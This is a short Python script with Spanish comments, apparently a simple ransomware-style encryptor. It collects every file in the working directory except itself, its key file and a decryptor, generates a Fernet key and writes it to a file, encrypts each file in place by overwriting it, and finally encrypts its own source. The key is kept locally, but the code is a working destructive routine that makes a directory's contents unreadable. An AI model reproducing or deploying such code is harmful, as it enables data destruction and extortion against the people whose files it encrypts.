import os
from cryptography.fernet import Fernet
script_name = os.path.basename(__file__)
files=[]
for file in os.listdir():
    if file=="Encriptador.py" or file=="thekey.key" or file=="Desencriptador.py":
        continue 
    if os.path.isfile(file):
        files.append(file)
     

key = Fernet.generate_key()

with open("thekey.key","wb") as thekey: #creamos un archivo thekey
    thekey.write(key) #le guardamos el valor de key ahi dentro

for file in files:
    with open(file,"rb") as thefile:
        contents=thefile.read()
    contents_encrypted=Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encrypted)
        
with open(script_name,"rb") as lastfile:
    contents=lastfile.read()
lastfile_encrypted=Fernet(key).encrypt(contents)
with open(script_name,"wb") as lastfile:
    lastfile.write(lastfile_encrypted)

